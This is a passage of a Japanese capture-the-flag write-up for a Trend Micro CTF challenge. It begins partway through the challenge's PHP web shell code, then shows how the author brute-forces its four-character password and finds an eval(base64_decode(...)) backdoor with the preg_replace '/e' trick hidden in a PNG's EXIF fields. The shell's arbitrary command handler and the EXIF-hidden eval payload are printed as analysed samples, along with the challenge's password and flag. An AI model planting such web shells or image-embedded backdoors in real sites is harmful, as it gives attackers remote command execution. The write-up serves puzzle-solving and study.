?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['support']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"call +99-99999-9999-999-99-99-9-99-9-999--99-99--9-9\";\n    }  \n }\n return $result;\n}\n\nfunction _3x3c_5h0wc0n74c7($cmd){\n $result = \"\";\n if (!empty($cmd))\n {\n    if ($cmd == \"showcontact\"){\n    ?>\n    <img align=\"left\" src=\"data:image/png;base64,<?php echo $GLOBALS['images']['contact']; ?>\" alt=\"figure\" />\n    <br>\n    <?php\n    $result = \"contact xxxxxxxxxyyyyyyyyzzzzzzz@trendmicro\";\n    }  \n }\n return $result;\n}\n\nif(isset($_REQUEST['cmd'])){\n        echo \"<pre>\";\n        $cmd = ($_REQUEST['cmd']);\n        echo myshellexec($cmd);\n        echo _3x3c_637v3r510n($cmd);\n        echo _3x3c_wh04u7h0r($cmd);\n        echo _3x3c_buyl1c3n53($cmd);\n        echo _3x3c_5h0wl0ck($cmd);\n        echo _3x3c_5h0w5upp0r7($cmd);\n        echo _3x3c_5h0wc0n74c7($cmd);\n        echo \"</pre>\";\n}\n?>\n</body>\n</html>\n```\n\nkey\u30d1\u30e9\u30e1\u30fc\u30bf\u3092md5\u3068sha1\u306e\u4e8c\u6bb5\u968e\u3067\u30cf\u30c3\u30b7\u30e5\u3057\u305f\u7d50\u679c\u3092 `$GLOBALS['key']`\u306e\u5024 `\"6c7f4d49729e58d7a458999b570e0151bc034ca7\"` \u3068\u6bd4\u8f03\u3057\u3066\u8a8d\u8a3c\u3057\u3066\u3044\u308b\u3002\n\n\u5185\u5bb9\u306f\u30a6\u30a7\u30d6\u30b7\u30a7\u30eb\u3063\u307d\u3044\u3051\u308c\u3069\u3082\u3001\u5404\u30b3\u30de\u30f3\u30c9\u306e\u5b9f\u884c\u7d50\u679c\u3084\u3001\u30b3\u30fc\u30c9\u3092\u4e00\u901a\u308a\u8aad\u3093\u3067\u3082\u3001\u30d5\u30e9\u30b0\u3063\u307d\u3044\u3082\u306e\u306f\u898b\u3064\u304b\u3089\u305a\u3001\u3060\u3044\u3076\u60a9\u3093\u3067\u3057\u307e\u3063\u305f\u3002\n\n## \u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u63a2\u7d22\n\n\u3075\u3068\u3001\u3072\u3087\u3063\u3068\u3057\u3066\u3001\u3053\u306e\u30a6\u30a7\u30d6\u30b7\u30a7\u30eb\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u304c\u30d5\u30e9\u30b0\u306a\u306e\u3067\u306f\u3068\u601d\u3044\u3064\u3044\u305f\u3002 \u3057\u304b\u3082\u300center ****\u300d\u3068\u3042\u308b\u306e\u3067\u3001\u3082\u30574\u6841\u306a\u3089\u63a2\u305b\u305d\u3046\u3068\u8003\u3048\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u8a66\u3057\u305f\u3089\u3001\u300ch4ck\u300d\u304c\u6c42\u307e\u3063\u305f\u3002 \u305f\u3060\u3001\u300cTMCTF{h4ck}\u300d\u3092\u30b5\u30d6\u30df\u30c3\u30c8\u3057\u3066\u3082\u4e0d\u6b63\u89e3\u3002\n\n```ruby\nrequire 'digest/md5'\nrequire 'digest/sha1'\n\ncs = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\".split(//)\n\ncs.each{|c1|\n  cs.each{|c2|\n    cs.each{|c3|\n      cs.each{|c4|\n        s = c1 + c2 + c3 + c4\n        s2 = Digest::SHA1.hexdigest(Digest::MD5.hexdigest(s))\n        if s2 == \"6c7f4d49729e58d7a458999b570e0151bc034ca7\"\n          puts s #=> h4ck\n          puts s2\n        end\n      }\n    }\n  }\n}\n```\n\n## \u753b\u50cf\u306b\u57cb\u3081\u8fbc\u307e\u308c\u305f\u30d2\u30f3\u30c8\n\n\u3072\u3087\u3063\u3068\u3057\u3066\u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u3067\u306a\u3051\u308c\u3070\u753b\u50cf\u306b\u4f55\u304b\u57cb\u3081\u8fbc\u307e\u308c\u3066\u3044\u308b\u306e\u3067\u306f\u3068\u601d\u3063\u3066\u3001`$GLOBALS['images']` \u4ee5\u4e0b\u306e\u753b\u50cf\u30c7\u30fc\u30bf\u3092\u5fa9\u53f7\u3057\u3066\u30d5\u30a1\u30a4\u30eb\u306b\u4fdd\u5b58\u3057\u3066`strings`\u3067\u898b\u3066\u307f\u308b\u3068\u3001lock\u306e\u753b\u50cf\u306b\u3060\u3051\u3001\u300czTXt\u300d\u3084\u300cRaw profile type exif\u300d\u3068\u3044\u3046\u6587\u5b57\u5217\u304c\u542b\u307e\u308c\u3066\u3044\u308b\u306e\u3092\u767a\u898b\u3002\n\nPNG\u306e\u30c1\u30e3\u30f3\u30af\u69cb\u9020\u3092\u4e00\u77ac\u8abf\u3079\u304b\u3051\u305f\u3051\u3069\u3001\u300cexif\u300d\u3068\u3042\u308b\u3057\u3001\u300c\u3082\u3057exiftool\u3067\u8868\u793a\u3067\u304d\u308b\u306a\u3089\u3001\u305d\u308c\u304c\u65e9\u3044\u304b\u300d\u3068\u601d\u3063\u3066\u8a66\u3057\u3066\u307f\u305f\u3089\u3001\u8868\u793a\u3067\u304d\u305f\u3002\n\n```\n$ exiftool lock.png \nexiftool lock.png \nExifTool Version Number         : 10.15\nFile Name                       : lock.png\nDirectory                       : .\nFile Size                       : 2.3 kB\nFile Modification Date/Time     : 2016:07:30 22:38:39+09:00\nFile Access Date/Time           : 2016:07:31 12:37:45+09:00\nFile Inode Change Date/Time     : 2016:07:30 22:45:15+09:00\nFile Permissions                : rw-r--r--\nFile Type                       : PNG\nFile Type Extension             : png\nMIME Type                       : image/png\nImage Width                     : 71\nImage Height                    : 114\nBit Depth                       : 8\nColor Type                      : Palette\nCompression                     : Deflate/Inflate\nFilter                          : Adaptive\nInterlace                       : Adam7 Interlace\nExif Byte Order                 : Little-endian (Intel, II)\nMake                            : /.*/e\nCamera Model Name               : eval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));\nSRGB Rendering                  : Perceptual\nGamma                           : 2.2\nPalette                         : (Binary data 585 bytes, use -b option to extract)\nTransparency                    : (Binary data 195 bytes, use -b option to extract)\nPixels Per Unit X               : 5905\nPixels Per Unit Y               : 5905\nPixel Units                     : meters\nImage Size                      : 71x114\nMegapixels                      : 0.008\n```\n\nCamera Model Name \u306b\u602a\u3057\u3044\u6587\u5b57\u5217\u300ceval(base64_decode(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\"));\u300d\u304c\u3002\u3068\u3044\u3046\u3053\u3068\u3067\u5fa9\u53f7\u3057\u3066\u307f\u308b\u3068\u3001\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u30d2\u30f3\u30c8\u304c\u5f97\u3089\u308c\u308b\u3002\n\n```\nirb(main):002:0> Base64.decode64(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\")\nBase64.decode64(\"ZWNobyAnZmxhZyBpcyBzaGExKHBhc3N3b3JkKSc7\")\n=> \"echo 'flag is sha1(password)';\"\n```\n\n\u3068\u3044\u3046\u308f\u3051\u3067\u3001\u5148\u307b\u3069\u306e\u30d1\u30b9\u30ef\u30fc\u30c9\u306e\u30cf\u30c3\u30b7\u30e5\u5024\u3092\u8a08\u7b97\u3057\u3066\u307f\u308b\u3068\u4ee5\u4e0b\u306e\u3088\u3046\u306b\u306a\u308a\u3001\u300cTMCTF{e17e98788d6b4ac922b2df100ef9398ae0f229ad}\u300d\u3092\u30b5\u30d6\u30df\u30c3\u30c8\u3057\u305f\u3089\u6b63\u89e3\u306b\u306a\u3063\u305f\u3002\n\n```\nirb(main):005:0> Digest::SHA1.hexdigest(\"h4ck\")\nDigest::SHA1.hexdigest(\"h4ck\")\n=> \"e17e98788d6b4ac922b2df100ef9398ae0f229ad\"\n```\n", "tags": ["CTF"]}